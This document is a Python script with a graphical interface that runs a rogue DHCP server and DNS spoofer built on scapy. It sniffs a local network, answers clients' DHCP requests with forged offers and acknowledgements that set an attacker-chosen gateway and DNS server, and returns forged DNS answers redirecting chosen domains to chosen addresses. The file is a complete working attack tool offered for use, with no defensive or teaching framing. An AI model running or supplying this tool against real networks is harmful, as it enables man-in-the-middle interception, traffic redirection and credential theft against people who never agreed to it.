import threading
from tkinter import *
from tkinter import scrolledtext
from tkinter import ttk
import psutil
from scapy.all import *

# Default configuration of the fake DHCP server
default_config = {
    "fake_dhcp_server_ip": "192.168.1.1",
    "fake_dhcp_server_mac": "02:42:ac:11:00:02",
    "subnet_mask": "255.255.255.0",
    "lease_time": 86400,
    "dns_server": "127.0.0.1",
    "default_gateway": "192.168.1.1",
    "assigned_ip": "192.168.1.100",
    "dns_spoofing": {
        "example.com": "5.6.7.8",
        "anotherexample.com": "9.10.11.12",
    },
}

# Global configuration
config = default_config.copy()


# Function to list all working network interfaces with friendly names
def list_working_interfaces():
    interfaces = psutil.net_if_addrs()
    friendly_names = [name for name in interfaces.keys()]
    return friendly_names


# Function to start sniffing DHCP and DNS packets from a specific IP or all IPs
def start_sniffing(interface, target_ip, target_mac):
    if target_ip and target_mac:
        filter_string = f"ip and (udp port 67 or udp port 68 or udp port 53) and host {target_ip} and ether src {target_mac}"
        log_text.insert(
            END,
            f"[*] Starting DHCP and DNS spoofing on interface {interface} for IP {target_ip} and MAC {target_mac}\n",
        )
    elif target_ip:
        filter_string = (
            f"ip and (udp port 67 or udp port 68 or udp port 53) and host {target_ip}"
        )
        log_text.insert(
            END,
            f"[*] Starting DHCP and DNS spoofing on interface {interface} for IP {target_ip}\n",
        )
    elif target_mac:
        filter_string = f"ip and (udp port 67 or udp port 68 or udp port 53) and ether src {target_mac}"
        log_text.insert(
            END,
            f"[*] Starting DHCP and DNS spoofing on interface {interface} for MAC {target_mac}\n",
        )
    else:
        filter_string = "ip and (udp port 67 or udp port 68 or udp port 53)"
        log_text.insert(
            END,
            f"[*] Starting DHCP and DNS spoofing on interface {interface} for all IPs\n",
        )
    log_text.insert(END, f"[*] Filter applied: {filter_string}\n")
    sniff(
        iface=interface,
        filter=filter_string,
        prn=handle_packet,
        store=0,
    )


# Function to handle packets and call appropriate spoofing functions
def handle_packet(pkt):
    log_text.insert(END, f"[Packet] {pkt.summary()}\n")  # Log every packet
    if pkt.haslayer(DHCP):
        dhcp_spoof(pkt)
    elif pkt.haslayer(DNS):
        dns_spoof(pkt)
    display_packet(pkt)  # Display packet details in the UI


# Function to create and send DHCP OFFER packets
def send_dhcp_offer(pkt):
    log_text.insert(END, f"[+] DHCP Discover received from {pkt[Ether].src}\n")
    offer_pkt = (
        Ether(src=config["fake_dhcp_server_mac"], dst=pkt[Ether].src)
        / IP(src=config["fake_dhcp_server_ip"], dst="255.255.255.255")
        / UDP(sport=67, dport=68)
        / BOOTP(
            op=2,
            yiaddr=config["assigned_ip"],
            siaddr=config["fake_dhcp_server_ip"],
            chaddr=pkt[Ether].src,
        )
        / DHCP(
            options=[
                ("message-type", "offer"),
                ("server_id", config["fake_dhcp_server_ip"]),
                ("lease_time", config["lease_time"]),
                ("subnet_mask", config["subnet_mask"]),
                ("router", config["default_gateway"]),
                ("name_server", config["dns_server"]),
                "end",
            ]
        )
    )
    sendp(offer_pkt, iface=interface)
    log_text.insert(END, f"[+] DHCP Offer sent to {pkt[Ether].src}\n")


# Function to create and send DHCP ACK packets
def send_dhcp_ack(pkt):
    log_text.insert(END, f"[+] DHCP Request received from {pkt[Ether].src}\n")
    ack_pkt = (
        Ether(src=config["fake_dhcp_server_mac"], dst=pkt[Ether].src)
        / IP(src=config["fake_dhcp_server_ip"], dst="255.255.255.255")
        / UDP(sport=67, dport=68)
        / BOOTP(
            op=2,
            yiaddr=config["assigned_ip"],
            siaddr=config["fake_dhcp_server_ip"],
            chaddr=pkt[Ether].src,
        )
        / DHCP(
            options=[
                ("message-type", "ack"),
                ("server_id", config["fake_dhcp_server_ip"]),
                ("lease_time", config["lease_time"]),
                ("subnet_mask", config["subnet_mask"]),
                ("router", config["default_gateway"]),
                ("name_server", config["dns_server"]),
                "end",
            ]
        )
    )
    sendp(ack_pkt, iface=interface)
    log_text.insert(END, f"[+] DHCP Ack sent to {pkt[Ether].src}\n")


# Function to handle DHCP spoofing
def dhcp_spoof(pkt):
    if pkt[DHCP].options[0][1] == 1:  # DHCP Discover
        send_dhcp_offer(pkt)
    elif pkt[DHCP].options[0][1] == 3:  # DHCP Request
        send_dhcp_ack(pkt)


# Function to log DNS queries and send spoofed responses
def dns_spoof(pkt):
    if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:  # DNS query
        if pkt.haslayer(IP):
            queried_domain = pkt[DNS].qd.qname.decode("utf-8").strip(".")
            log_text.insert(
                END,
                f"[+] DNS Query for {queried_domain} from {pkt[IP].src}\n",
            )
            if queried_domain in config["dns_spoofing"]:
                spoofed_ip = config["dns_spoofing"][queried_domain]
                dns_response = (
                    IP(dst=pkt[IP].src, src=pkt[IP].dst)
                    / UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)
                    / DNS(
                        id=pkt[DNS].id,
                        qr=1,
                        aa=1,
                        qd=pkt[DNS].qd,
                        an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=86400, rdata=spoofed_ip),
                    )
                )
                send(dns_response, iface=interface)
                log_text.insert(
                    END,
                    f"[+] Spoofed DNS Response sent for {queried_domain} with IP {spoofed_ip}\n",
                )


# Function to display packet details
def display_packet(pkt):
    if pkt.haslayer(IP):
        log_text.insert(END, f"[Packet] {pkt.summary()}\n")
        if pkt.haslayer(DHCP):
            log_text.insert(END, f"DHCP Message Type: {pkt[DHCP].options[0][1]}\n")
        if pkt.haslayer(DNS):
            log_text.insert(END, f"DNS Query: {pkt[DNS].qd.qname.decode('utf-8')}\n")


# Function to start the sniffing thread
def start_sniffing_thread():
    global interface, target_ip, target_mac
    interface = interface_var.get()
    target_ip = target_ip_var.get().strip()
    target_mac = target_mac_var.get().strip()
    threading.Thread(
        target=start_sniffing, args=(interface, target_ip, target_mac)
    ).start()


# Function to update the configuration with user inputs
def update_config():
    config["fake_dhcp_server_ip"] = dhcp_server_ip_var.get()
    config["fake_dhcp_server_mac"] = dhcp_server_mac_var.get()
    config["subnet_mask"] = subnet_mask_var.get()
    config["lease_time"] = int(lease_time_var.get())
    config["dns_server"] = dns_server_var.get()
    config["default_gateway"] = default_gateway_var.get()
    config["assigned_ip"] = assigned_ip_var.get()
    log_text.insert(END, "[*] Configuration updated\n")


# Main program starts here
root = Tk()
root.title("DHCP and DNS Spoofing")

tab_control = ttk.Notebook(root)

# Tab for interface selection and logging
tab1 = ttk.Frame(tab_control)
tab_control.add(tab1, text="Main")

interface_var = StringVar(tab1)
interfaces = list_working_interfaces()
interface_var.set(interfaces[0])

Label(tab1, text="Select Network Interface:").pack(pady=10)
OptionMenu(tab1, interface_var, *interfaces).pack(pady=10)

Label(tab1, text="Target IP (leave empty for all IPs):").pack(pady=10)
target_ip_var = StringVar(tab1)
Entry(tab1, textvariable=target_ip_var).pack(pady=10)

Label(tab1, text="Target MAC (leave empty for all MACs):").pack(pady=10)
target_mac_var = StringVar(tab1)
Entry(tab1, textvariable=target_mac_var).pack(pady=10)

Button(tab1, text="Start Spoofing", command=start_sniffing_thread).pack(pady=10)

log_text = scrolledtext.ScrolledText(tab1, width=100, height=20)
log_text.pack(pady=10)

# Tab for configuration settings
tab2 = ttk.Frame(tab_control)
tab_control.add(tab2, text="Configuration")

Label(tab2, text="DHCP Server IP:").grid(row=0, column=0, padx=10, pady=5, sticky=E)
dhcp_server_ip_var = StringVar(value=default_config["fake_dhcp_server_ip"])
Entry(tab2, textvariable=dhcp_server_ip_var).grid(row=0, column=1, padx=10, pady=5)

Label(tab2, text="DHCP Server MAC:").grid(row=1, column=0, padx=10, pady=5, sticky=E)
dhcp_server_mac_var = StringVar(value=default_config["fake_dhcp_server_mac"])
Entry(tab2, textvariable=dhcp_server_mac_var).grid(row=1, column=1, padx=10, pady=5)

Label(tab2, text="Subnet Mask:").grid(row=2, column=0, padx=10, pady=5, sticky=E)
subnet_mask_var = StringVar(value=default_config["subnet_mask"])
Entry(tab2, textvariable=subnet_mask_var).grid(row=2, column=1, padx=10, pady=5)

Label(tab2, text="Lease Time:").grid(row=3, column=0, padx=10, pady=5, sticky=E)
lease_time_var = StringVar(value=str(default_config["lease_time"]))
Entry(tab2, textvariable=lease_time_var).grid(row=3, column=1, padx=10, pady=5)

Label(tab2, text="DNS Server:").grid(row=4, column=0, padx=10, pady=5, sticky=E)
dns_server_var = StringVar(value=default_config["dns_server"])
Entry(tab2, textvariable=dns_server_var).grid(row=4, column=1, padx=10, pady=5)

Label(tab2, text="Default Gateway:").grid(row=5, column=0, padx=10, pady=5, sticky=E)
default_gateway_var = StringVar(value=default_config["default_gateway"])
Entry(tab2, textvariable=default_gateway_var).grid(row=5, column=1, padx=10, pady=5)

Label(tab2, text="Assigned IP:").grid(row=6, column=0, padx=10, pady=5, sticky=E)
assigned_ip_var = StringVar(value=default_config["assigned_ip"])
Entry(tab2, textvariable=assigned_ip_var).grid(row=6, column=1, padx=10, pady=5)

Button(tab2, text="Update Configuration", command=update_config).grid(
    row=7, columnspan=2, pady=10
)

tab_control.pack(expand=1, fill="both")

root.mainloop()
